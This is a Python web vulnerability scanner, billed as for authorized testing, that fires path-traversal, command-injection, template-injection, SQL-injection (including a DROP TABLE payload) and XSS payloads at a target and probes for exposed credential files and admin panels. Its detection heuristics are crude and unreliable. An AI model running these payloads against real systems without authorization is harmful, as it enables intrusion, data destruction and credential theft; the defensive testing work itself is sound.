#!/usr/bin/env python3
"""
Advanced Web Vulnerability Scanner
Professional Security Assessment Tool
Developed for Educational and Authorized Security Testing
"""

import requests
import urllib.parse
import threading
import time
from datetime import datetime
import sys
import os
import json
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedVulnerabilityScanner:
    def __init__(self, timeout=10, threads=5):
        self.results = {
            'target': '',
            'scan_time': '',
            'vulnerabilities': [],
            'statistics': {
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'total': 0
            }
        }
        self.session = requests.Session()
        self.timeout = timeout
        self.max_threads = threads
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

    def display_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗ ███████╗ ██████╗      ║
║   ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝██╔═══██╗     ║
║   ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║  ███╗█████╗  ██║   ██║     ║
║   ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║   ██║     ║
║   ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╔╝███████╗╚██████╔╝     ║
║   ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝      ║
║                                                                              ║
║                  ADVANCED VULNERABILITY SCANNER v3.0                        ║
║                 Professional Security Assessment Tool                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def print_status(self, message, level="INFO"):
        colors = {
            "INFO": "\033[94m",      # Blue
            "SUCCESS": "\033[92m",   # Green
            "WARNING": "\033[93m",   # Yellow
            "ERROR": "\033[91m",     # Red
            "CRITICAL": "\033[95m",  # Magenta
            "DEBUG": "\033[90m"      # Gray
        }
        reset = "\033[0m"
        timestamp = datetime.now().strftime("%H:%M:%S")
        level_icon = {
            "INFO": "ℹ️",
            "SUCCESS": "✅",
            "WARNING": "⚠️",
            "ERROR": "❌",
            "CRITICAL": "🚨",
            "DEBUG": "🔍"
        }
        print(f"{colors.get(level, '')}{level_icon.get(level, '')} [{timestamp}] {message}{reset}")

    def test_endpoint(self, url, method="GET", data=None):
        """Test a single endpoint with error handling"""
        try:
            if method.upper() == "GET":
                response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
            return response
        except requests.exceptions.RequestException as e:
            self.print_status(f"Request failed for {url}: {str(e)}", "DEBUG")
            return None

    def check_lfi_vulnerabilities(self, base_url, parameters):
        """Scan for Local File Inclusion and Path Traversal vulnerabilities"""
        self.print_status("Starting LFI and Path Traversal scan...", "INFO")
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../../etc/passwd%00",
            "../../../../windows/win.ini",
            "../../../../windows/system.ini",
            "....//....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
            "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini"
        ]
        
        vulnerabilities = []
        
        def test_lfi_payload(param, payload):
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            response = self.test_endpoint(test_url)
            
            if response and response.status_code == 200:
                content_lower = response.text.lower()
                indicators = [
                    "root:", "daemon:", "bin:", "sys:",
                    "[boot loader]", "[extensions]", "[fonts]",
                    "mysql", "database", "password"
                ]
                
                if any(indicator in content_lower for indicator in indicators):
                    return {
                        'type': 'LFI/Path Traversal',
                        'level': 'HIGH',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Sensitive file content found in response',
                        'response_code': response.status_code,
                        'response_length': len(response.text)
                    }
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for param in parameters:
                for payload in lfi_payloads:
                    futures.append(executor.submit(test_lfi_payload, param, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    self.print_status(f"LFI vulnerability found in parameter: {result['parameter']}", "CRITICAL")
        
        return vulnerabilities

    def check_exposed_configs(self, base_url):
        """Scan for exposed configuration files"""
        self.print_status("Scanning for exposed configuration files...", "INFO")
        
        config_files = [
            "/.env", "/config.php", "/configuration.ini", "/config.json",
            "/web.config", "/appsettings.json", "/.git/config",
            "/.htaccess", "/robots.txt", "/.DS_Store",
            "/backup.zip", "/dump.sql", "/database.sqlite",
            "/wp-config.php", "/config/database.php",
            "/application/config/database.php",
            "/includes/config.php", "/src/config.py",
            "/.aws/credentials", "/.npmrc", "/.dockercfg"
        ]
        
        exposed_files = []
        
        def test_config_file(file_path):
            test_url = base_url.rstrip('/') + file_path
            response = self.test_endpoint(test_url)
            
            if response and response.status_code == 200:
                # Check if it's not an error page
                if len(response.text) > 0 and not any(error in response.text.lower() for error in ['error', 'not found', '404']):
                    return {
                        'type': 'Exposed Configuration File',
                        'level': 'HIGH',
                        'url': test_url,
                        'filename': file_path,
                        'response_code': response.status_code,
                        'file_size': len(response.content),
                        'evidence': f'Configuration file accessible at {test_url}'
                    }
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(test_config_file, file_path) for file_path in config_files]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    exposed_files.append(result)
                    self.print_status(f"Exposed config file found: {result['filename']}", "WARNING")
        
        return exposed_files

    def check_admin_panels(self, base_url):
        """Scan for admin panels and management interfaces"""
        self.print_status("Scanning for admin panels...", "INFO")
        
        admin_paths = [
            "/admin", "/administrator", "/wp-admin", "/dashboard",
            "/controlpanel", "/login", "/cpanel", "/webadmin",
            "/manager", "/admin/login", "/administrator/login",
            "/admincp", "/system", "/root", "/backend",
            "/phpmyadmin", "/mysql", "/dbadmin", "/_admin",
            "/server-status", "/webdav", "/_cat", "/_plugin"
        ]
        
        admin_panels = []
        
        def test_admin_panel(path):
            test_url = base_url.rstrip('/') + path
            response = self.test_endpoint(test_url)
            
            if response and response.status_code in [200, 301, 302, 401, 403]:
                title = self.extract_title(response.text)
                
                # Check for admin panel indicators
                indicators = ['admin', 'login', 'dashboard', 'control panel', 'cpanel']
                content_lower = response.text.lower()
                
                if any(indicator in content_lower for indicator in indicators) or response.status_code in [401, 403]:
                    return {
                        'type': 'Admin Panel Discovered',
                        'level': 'MEDIUM',
                        'url': test_url,
                        'path': path,
                        'status_code': response.status_code,
                        'title': title,
                        'evidence': f'Admin interface accessible at {test_url}'
                    }
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(test_admin_panel, path) for path in admin_paths]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    admin_panels.append(result)
                    self.print_status(f"Admin panel found: {result['path']}", "WARNING")
        
        return admin_panels

    def check_rce_vulnerabilities(self, base_url, parameters):
        """Scan for Remote Code Execution vulnerabilities"""
        self.print_status("Scanning for RCE vulnerabilities...", "INFO")
        
        rce_payloads = [
            ";whoami", "|whoami", "`whoami`", "$(whoami)",
            "{{7*7}}", "<%= 7*7 %>", "<?php echo 7*7; ?>",
            "| dir", "; ls -la", "`cat /etc/passwd`",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "#{7*7}", "${7*7}"
        ]
        
        rce_vulns = []
        
        def test_rce_payload(param, payload):
            # Test GET request
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            response_get = self.test_endpoint(test_url)
            
            # Test POST request
            test_data = {param: payload}
            response_post = self.test_endpoint(base_url, "POST", test_data)
            
            responses = [r for r in [response_get, response_post] if r]
            
            for response in responses:
                if response and response.status_code == 200:
                    indicators = ["www-data", "root", "administrator", "nt authority", "49", "whoami"]
                    content_lower = response.text.lower()
                    
                    if any(indicator in content_lower for indicator in indicators):
                        return {
                            'type': 'Remote Code Execution',
                            'level': 'CRITICAL',
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET' if response == response_get else 'POST',
                            'evidence': 'Command execution indicators found in response',
                            'response_code': response.status_code
                        }
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for param in parameters:
                for payload in rce_payloads:
                    futures.append(executor.submit(test_rce_payload, param, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    rce_vulns.append(result)
                    self.print_status(f"RCE vulnerability found: {result['parameter']}", "CRITICAL")
        
        return rce_vulns

    def check_sql_injection(self, base_url, parameters):
        """Scan for SQL Injection vulnerabilities"""
        self.print_status("Scanning for SQL Injection vulnerabilities...", "INFO")
        
        sql_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' UNION SELECT 1,2,3--",
            "' AND 1=1", "' AND 1=2", "' WAITFOR DELAY '0:0:5'--",
            "'; DROP TABLE users--", "' OR SLEEP(5)--"
        ]
        
        sql_vulns = []
        
        def test_sql_payload(param, payload):
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            
            # Time-based detection
            start_time = time.time()
            response = self.test_endpoint(test_url)
            response_time = time.time() - start_time
            
            if response and response.status_code == 200:
                # Error-based detection
                sql_errors = [
                    "sql syntax", "mysql_fetch", "ora-", "microsoft odbc",
                    "postgresql", "sqlite3", "warning:", "mysql error",
                    "unclosed quotation", "undefined function"
                ]
                
                content_lower = response.text.lower()
                
                if any(error in content_lower for error in sql_errors):
                    return {
                        'type': 'SQL Injection',
                        'level': 'CRITICAL',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'SQL error messages found in response',
                        'detection_method': 'Error-based',
                        'response_code': response.status_code
                    }
                
                # Time-based detection
                elif response_time > 5:
                    return {
                        'type': 'SQL Injection',
                        'level': 'HIGH',
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Delayed response detected: {response_time:.2f}s',
                        'detection_method': 'Time-based',
                        'response_time': response_time,
                        'response_code': response.status_code
                    }
            
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for param in parameters:
                for payload in sql_payloads:
                    futures.append(executor.submit(test_sql_payload, param, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    sql_vulns.append(result)
                    self.print_status(f"SQL Injection found: {result['parameter']}", "CRITICAL")
        
        return sql_vulns

    def check_xss_vulnerabilities(self, base_url, parameters):
        """Scan for Cross-Site Scripting vulnerabilities"""
        self.print_status("Scanning for XSS vulnerabilities...", "INFO")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        xss_vulns = []
        
        def test_xss_payload(param, payload):
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            response = self.test_endpoint(test_url)
            
            if response and response.status_code == 200:
                if payload in response.text:
                    return {
                        'type': 'Cross-Site Scripting (XSS)',
                        'level': 'MEDIUM',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'XSS payload reflected in response without sanitization',
                        'response_code': response.status_code
                    }
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for param in parameters:
                for payload in xss_payloads:
                    futures.append(executor.submit(test_xss_payload, param, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    xss_vulns.append(result)
                    self.print_status(f"XSS vulnerability found: {result['parameter']}", "WARNING")
        
        return xss_vulns

    def extract_title(self, html):
        """Extract page title from HTML content"""
        try:
            start = html.find('<title>') + 7
            end = html.find('</title>')
            if start > 6 and end > start:
                return html[start:end].strip()[:100]
        except:
            pass
        return "No Title"

    def scan_website(self, target_url):
        """Comprehensive website security scan"""
        self.print_status(f"Starting comprehensive scan for: {target_url}", "INFO")
        
        self.results['target'] = target_url
        self.results['scan_time'] = datetime.now().isoformat()
        
        try:
            # Initial request to analyze the target
            response = self.test_endpoint(target_url)
            if not response:
                self.print_status("Target is not accessible", "ERROR")
                return
            
            self.print_status(f"Target responded with status code: {response.status_code}", "INFO")
            
            # Common parameters to test
            parameters = ['id', 'page', 'file', 'path', 'view', 'load', 'url', 'dir', 'cmd', 'exec']
            
            # Run all security scans
            scan_methods = [
                (self.check_lfi_vulnerabilities, [target_url, parameters]),
                (self.check_exposed_configs, [target_url]),
                (self.check_admin_panels, [target_url]),
                (self.check_rce_vulnerabilities, [target_url, parameters]),
                (self.check_sql_injection, [target_url, parameters]),
                (self.check_xss_vulnerabilities, [target_url, parameters])
            ]
            
            with ThreadPoolExecutor(max_workers=3) as executor:
                futures = [executor.submit(method, *args) for method, args in scan_methods]
                
                for future in as_completed(futures):
                    try:
                        vulnerabilities = future.result()
                        self.results['vulnerabilities'].extend(vulnerabilities)
                    except Exception as e:
                        self.print_status(f"Scan method failed: {str(e)}", "ERROR")
            
            # Calculate statistics
            self.calculate_statistics()
            
        except Exception as e:
            self.print_status(f"Scan failed: {str(e)}", "ERROR")

    def calculate_statistics(self):
        """Calculate vulnerability statistics"""
        for vuln in self.results['vulnerabilities']:
            level = vuln['level'].upper()
            if level == 'CRITICAL':
                self.results['statistics']['critical'] += 1
            elif level == 'HIGH':
                self.results['statistics']['high'] += 1
            elif level == 'MEDIUM':
                self.results['statistics']['medium'] += 1
            elif level == 'LOW':
                self.results['statistics']['low'] += 1
            
            self.results['statistics']['total'] += 1

    def generate_report(self):
        """Generate comprehensive scan report"""
        print("\n" + "="*100)
        print("📊 VULNERABILITY SCAN REPORT")
        print("="*100)
        
        print(f"🎯 Target: {self.results['target']}")
        print(f"🕐 Scan Time: {self.results['scan_time']}")
        print(f"📈 Statistics:")
        print(f"   🔴 Critical: {self.results['statistics']['critical']}")
        print(f"   🟠 High: {self.results['statistics']['high']}")
        print(f"   🟡 Medium: {self.results['statistics']['medium']}")
        print(f"   🔵 Low: {self.results['statistics']['low']}")
        print(f"   📊 Total: {self.results['statistics']['total']}")
        
        if not self.results['vulnerabilities']:
            self.print_status("No vulnerabilities found!", "SUCCESS")
            return
        
        print("\n" + "="*100)
        print("🔍 VULNERABILITY DETAILS")
        print("="*100)
        
        # Group by vulnerability type
        vuln_by_type = {}
        for vuln in self.results['vulnerabilities']:
            vuln_type = vuln['type']
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)
        
        for vuln_type, vulnerabilities in vuln_by_type.items():
            print(f"\n🎯 {vuln_type.upper()}")
            print("-" * 50)
            
            for i, vuln in enumerate(vulnerabilities, 1):
                color = {
                    'CRITICAL': '\033[91m',
                    'HIGH': '\033[93m', 
                    'MEDIUM': '\033[94m',
                    'LOW': '\033[92m'
                }.get(vuln['level'], '\033[0m')
                
                print(f"{color}[{i}] Level: {vuln['level']}")
                print(f"    URL/Parameter: {vuln.get('url', vuln.get('parameter', 'N/A'))}")
                print(f"    Evidence: {vuln.get('evidence', 'N/A')}")
                if 'payload' in vuln:
                    print(f"    Payload: {vuln['payload'][:50]}...")
                print(f"    Response Code: {vuln.get('response_code', 'N/A')}\033[0m")
                print()

    def save_report(self, filename=None):
        """Save report to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"vulnerability_scan_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=4, ensure_ascii=False)
            self.print_status(f"Report saved to: {filename}", "SUCCESS")
        except Exception as e:
            self.print_status(f"Failed to save report: {str(e)}", "ERROR")

def main():
    parser = argparse.ArgumentParser(description='Advanced Web Vulnerability Scanner')
    parser.add_argument('target', nargs='?', help='Target URL to scan')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('-th', '--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('-o', '--output', help='Output file for the report')
    
    args = parser.parse_args()
    
    scanner = AdvancedVulnerabilityScanner(timeout=args.timeout, threads=args.threads)
    scanner.display_banner()
    
    print("🔐 Advanced Web Vulnerability Scanner - For Educational and Authorized Testing Only")
    print("⚠️  Always obtain proper authorization before scanning any website\n")
    
    target = args.target
    if not target:
        target = input("🎯 Enter target URL: ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        start_time = time.time()
        scanner.scan_website(target)
        scan_time = time.time() - start_time
        
        scanner.generate_report()
        
        print(f"\n⏱️  Scan completed in {scan_time:.2f} seconds")
        
        # Save report if requested
        if args.output or input("\n💾 Save report to file? (y/n): ").lower() == 'y':
            filename = args.output if args.output else None
            scanner.save_report(filename)
            
    except KeyboardInterrupt:
        scanner.print_status("Scan interrupted by user", "ERROR")
    except Exception as e:
        scanner.print_status(f"Scan failed: {str(e)}", "ERROR")

if __name__ == "__main__":
    main()